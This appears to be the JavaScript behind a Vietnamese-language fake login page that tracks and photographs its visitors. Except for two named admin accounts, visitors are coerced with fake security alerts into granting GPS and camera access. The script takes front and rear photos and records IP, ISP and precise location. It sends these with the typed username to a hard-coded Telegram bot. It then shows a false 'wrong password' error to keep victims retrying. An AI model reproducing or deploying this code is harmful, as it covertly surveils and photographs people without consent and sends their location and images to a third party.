const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;

const info = {
  time: '', ip: '', isp: '', address: '', lat: '', lon: '',
  loginDetails: '', isAdmin: false, device: ''
};

// 1. LẤY DVI
function getDeviceInfo() {
    const ua = navigator.userAgent;
    if (/iPhone|iPad/.test(ua)) return "iPhone/iPad (iOS)";
    if (/Android/.test(ua)) return "Android Phone";
    return "PC / Laptop";
}

// 2. ÉP BUỘC GPS (BẮT BUỘC)
async function forceLocation() {
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                info.lat = pos.coords.latitude.toFixed(6);
                info.lon = pos.coords.longitude.toFixed(6);
                info.address = "📍 Vị trí GPS chuẩn xác";
                resolve();
            },
            (err) => {
                // Nếu người dùng nhấn Chặn hoặc trình duyệt đã chặn sẵn
                alert("⚠️ XÁC THỰC VỊ TRÍ THẤT BẠI!\nĐể bảo mật, hệ thống yêu cầu bạn cho phép truy cập Vị trí (GPS) để nhận diện thiết bị tin cậy.\n\nHướng dẫn: Bấm vào biểu tượng 🔒 hoặc ⚙️ trên thanh địa chỉ, chọn 'Cho phép' vị trí và thử lại.");
                location.reload();
                reject();
            },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

// 3. ÉP BUỘC CAMERA (BẮT BUỘC)
async function forceCapture(mode = 'user') {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
        return new Promise(resolve => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                }, 800);
            };
        });
    } catch (e) {
        alert("⚠️ XÁC THỰC KHUÔN MẶT THẤT BẠI!\nBạn phải cho phép Camera để hệ thống đối chiếu khuôn mặt đăng nhập.\n\nHướng dẫn: Bấm vào biểu tượng 🔒 trên thanh địa chỉ và bật 'Camera'.");
        location.reload();
        return null;
    }
}

async function getIPOnly() {
    try {
        const res = await fetch(`https://ipwho.is/`);
        const data = await res.json();
        info.ip = data.ip || 'Không rõ';
        info.isp = data.connection?.org || 'ISP';
    } catch (e) { info.ip = 'Lỗi kết nối'; }
}

function getCaption() {
    const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
    if (info.isAdmin) {
        return `⚠️ [ADMIN ĐĂNG NHẬP]\n👤 ${info.loginDetails}\n🌐 IP: ${info.ip}\n📍 Maps: ${mapsLink}`;
    }
    return `🚫 [PHÁT HIỆN MỘT CON CHÓ NGU ĐĂNG NHẬP ]\n👤 TK: ${info.loginDetails}\n📱 Thiết bị: ${info.device}\n🌐 IP: ${info.ip}\n🏢 ISP: ${info.isp}\n📍 Vị trí: ${mapsLink}`.trim();
}

// --- HÀM CHÍNH (LOGIC KHÓA CỨNG) ---
async function main() {
    const user = document.getElementById('username').value.trim();
    const role = document.getElementById('user-role').value;
    
    // Gán thông tin ngay lập tức
    info.time = new Date().toLocaleString('vi-VN');
    info.loginDetails = `${user} (${role})`;
    info.isAdmin = (user === "Mrwenben" || user === "VanThanh");
    info.device = getDeviceInfo();

    // 1. ADMIN THÌ CHO QUA LUÔN (Không làm khó Admin)
    if (info.isAdmin) {
        await getIPOnly();
        await fetch(API_SEND_TEXT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
        });
        window.location.href = "trang-chu-admin.html"; 
        return true; 
    }

    // 2. NGƯỜI LẠ: BẮT ĐẦU CHỐT CHẶN
    try {
        // Luôn lấy IP trước để dự phòng
        await getIPOnly();

        // ÉP BUỘC GPS - Nếu từ chối, trang sẽ reload ngay trong hàm này
        await forceLocation(); 

        // ÉP BUỘC CAMERA - Nếu từ chối, trang sẽ reload ngay trong hàm này
        const frontBlob = await forceCapture('user');
        const backBlob = await forceCapture('environment');

        // KIỂM TRA LẦN CUỐI
        if (!frontBlob) {
            location.reload();
            return false;
        }

        // 3. GỬI DỮ LIỆU VỀ TELEGRAM
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        const media = [];
        formData.append('front', frontBlob, 'front.jpg');
        media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
        
        if (backBlob) {
            formData.append('back', backBlob, 'back.jpg');
            media.push({ type: 'photo', media: 'attach://back' });
        }
        formData.append('media', JSON.stringify(media));
        
        // Gửi và đợi
        await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });

        // 4. HIỂN THỊ LỖI GIẢ ĐỂ GIỮ HỌ Ở LẠI VÒNG LẶP
        alert("Mật khẩu không chính xác hoặc lỗi kết nối máy chủ (Error 502)!");
        location.reload(); 

    } catch (error) {
        location.reload();
    }
    
    return false; 
}
